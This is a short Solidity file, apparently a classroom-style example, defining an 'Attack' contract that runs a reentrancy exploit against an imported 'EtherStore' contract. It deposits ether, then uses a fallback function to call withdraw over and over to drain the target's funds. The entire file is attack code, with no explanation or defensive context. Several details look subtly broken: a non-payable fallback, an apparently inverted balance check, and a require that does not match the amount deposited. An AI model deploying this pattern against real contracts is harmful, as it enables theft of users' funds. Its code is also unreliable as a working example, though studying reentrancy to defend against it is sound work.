// SPDX-License-Identifier: MIT

pragma solidity >=0.5.0 <0.9.0 ;

import "./EtherStore.sol";

contract Attack {
    
    EtherStore public etherStore;
    uint256 constant public AMOUNT = 10 ether;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

   
    fallback() external  {
        if (address(etherStore).balance <= AMOUNT) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value <= AMOUNT);
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }

   
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}